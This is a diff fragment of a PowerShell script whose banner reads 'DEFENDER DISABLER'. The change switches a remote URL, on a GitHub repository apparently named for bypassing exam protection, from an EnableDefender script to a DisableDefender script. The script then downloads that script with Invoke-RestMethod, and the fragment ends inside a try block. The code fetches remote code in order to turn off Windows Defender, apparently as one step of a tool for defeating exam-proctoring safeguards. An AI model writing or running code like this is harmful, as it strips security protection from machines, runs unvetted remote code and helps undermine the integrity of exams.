@@ -55,7 +55,7 @@ Write-Host "================================================================" -F
 Write-Host " STEP 1/4 : DEFENDER DISABLER"
 Write-Host "================================================================" -ForegroundColor DarkCyan
 
-$defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/EnableDefender.ps1"
+$defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"
 Write-Host "Fetching: $defenderUrl"
 try {
     $defenderScript = Invoke-RestMethod -Uri $defenderUrl -ErrorAction Stop
